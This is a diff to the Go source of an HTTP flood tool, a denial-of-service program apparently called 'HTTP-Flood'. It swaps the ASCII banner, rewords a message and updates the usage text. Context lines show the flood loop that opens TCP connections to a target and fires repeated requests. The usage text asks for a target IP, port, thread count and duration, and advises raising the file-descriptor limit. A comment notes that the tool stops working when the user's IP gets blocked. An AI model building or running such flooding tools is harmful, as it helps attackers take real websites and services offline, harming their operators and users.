@@ -177,7 +177,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("[!] Connection Down !") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("[!] Connection Down") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -197,23 +197,19 @@ func flood() {
 }
 
 func main() {
-	fmt.Println("\r\n ")
-	fmt.Println("      .---.        .----------- ")
-	fmt.Println("     /     \  __  /    ------   ")
-	fmt.Println("    / /     \(..)/    -----     ")
-	fmt.Println("   //////   ' \/ `   ---        ")
-	fmt.Println("  //// / // :    : ---          ")
-	fmt.Println(" // /   /  /`    '--            ")
-	fmt.Println("//          //..\\              ")
-	fmt.Println("       ====UU====UU====         ")
-	fmt.Println("           '//||\\`             ")
-	fmt.Println("             ''``               ")
-	fmt.Println("           ASPARTIM             ")
-	fmt.Println(" -------------------------------")
-	fmt.Println(" ")
+	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
+	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
+	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
+	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
+	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
+	fmt.Println("                          ||                                             ")
+	fmt.Println("                         .||                     Golang version 1.8      ")
+	fmt.Println("                                                        C0d3d By L330n123")
+	fmt.Println("==========================================================================")
 	if len(os.Args) != 8 {
-		fmt.Println("Linux Please Run 'ulimit -n 999999' !")
-		fmt.Println("Usage : ", os.Args[0], "<ip> <port> <threads> <page> <get/post> <seconds> <header.txt>")
+		fmt.Println("Post Mode will use header.txt as data")
+		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
+		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <page> <get/post> <seconds> <header.txt/nil>")
 		os.Exit(1)
 	}
 	threads, err := strconv.Atoi(os.Args[3])
